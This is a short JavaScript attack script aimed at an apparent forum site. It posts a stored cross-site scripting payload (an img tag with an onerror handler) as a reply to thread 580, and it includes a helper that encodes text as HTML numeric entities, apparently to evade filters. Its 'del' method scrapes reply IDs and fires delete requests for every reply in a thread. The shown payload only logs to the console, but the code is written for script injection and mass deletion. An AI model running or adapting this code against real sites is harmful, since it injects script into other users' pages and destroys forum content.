function xss(content) {
	this.url = "/?a=addReply",
	this.data = {
		'reply_content': typeof content != "undefined" ? content : '学习了<img src="1" onerror="console.log(/error/)" alt="" />',
		'tiezi_id': '580'
	},
	this.callback = function (data) {
		console.log(JSON.parse(data));
	}
}
xss.prototype = {
	post: function () {
		$.post(this.url, this.data, this.callback);
	},
	ch : function (str) {
		return "&#" + str.split("").map(function(data) {return data.charCodeAt();}).join("&#");
	},
	del : function () {
		var ids = $(".reply").map(function(data, index) {return (index.id+"").split("-")[1]});
		var tid = location.href.split("&").map(function(index, data) {if(index.match("id")){return index;}})[1].split("=")[1];
		for(var i = 0, l = ids.length; i<l; i++) {
			var url = "/?c=ajax&a=delReply&id=" + ids[i]+"" + "&tid=" + tid+"";
			setTimeout(get(url), 20);
		}
		function get(url) {
			$.get(url, function(data) {
				console.log(data);
			});
		}
	}
}
var x = new xss;
